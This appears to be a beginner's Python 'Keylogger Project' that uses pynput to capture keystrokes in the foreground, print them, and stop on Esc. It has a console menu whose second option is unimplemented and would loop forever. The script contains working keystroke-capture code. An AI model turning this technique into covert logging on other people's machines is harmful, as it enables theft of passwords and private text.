from pynput import keyboard
class Logger:

    #take in key, saves it and then prints out key
    def record(key):
        try:
            if key != keyboard.Key.esc:
                keysave.append(key)
                print(key.char)
        except AttributeError:
            keysave.append(str(key)[4:])
            print(str(key)[4:])

    #recording stops when pressing esc
    def stopRecord(key):
        if key == keyboard.Key.esc:
            return False

print("Welcome to Keylogger Project")

#input for menu selection
menu = input("Press 1 to record Keys: \nPress 2 to see recorded Keys: \n")

#list for keys saved
keysave = []

while True:
    #selection for recording
    if  menu == "1":
        print("Recording... \nPress Esc to stop recording")
        #joins both record and stopRecord
        with keyboard.Listener(on_press=Logger.record, on_release=Logger.stopRecord) as listener:
            listener.join()
            print(keysave)
        break
    #selection for record saving
    elif menu == "2":
        pass
    else:
        print("Incorrect Number. Please choose a number from the selection.")
        menu = input("Press 1 to record Keys: \nPress 2 to see recorded Keys: \n")

    
